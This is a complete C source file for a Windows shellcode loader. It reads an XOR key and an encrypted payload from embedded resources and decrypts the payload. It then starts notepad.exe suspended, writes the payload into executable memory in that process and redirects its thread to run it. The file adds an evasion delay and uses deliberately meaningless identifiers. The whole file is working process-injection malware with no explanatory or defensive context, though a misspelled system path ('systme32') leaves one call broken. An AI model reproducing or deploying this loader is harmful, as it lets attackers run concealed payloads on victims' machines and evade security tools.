#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void thisistheloadresou(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void youareawsomeenc(char* dancode, DWORD dancodeLen, unsigned char* dkdan1e2y6, DWORD dank1e2y6Len) {
    for (DWORD i = 0; i < dancodeLen; i++) {
        dancode[i] ^= dkdan1e2y6[i % dank1e2y6Len];
    }
}

int main() {
    Sleep(3000);

    char* dank1e6ENC;
    DWORD dank1e6ENCLen;
    thisistheloadresou("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);

    char* codfhu;
    DWORD codfhuLen;
    thisistheloadresou("dhanushcode56", &codfhu, &codfhuLen);

    youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CreateProcess("C:\\Windows\\systme32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
      

    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pi.hThread, &ctx);

    LPVOID dankummm = VirtualAllocEx(pi.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    WriteProcessMemory(pi.hProcess, dankummm, codfhu, codfhuLen, NULL);
    ctx.Rcx = (DWORD64)dankummm; 
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread); 

    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
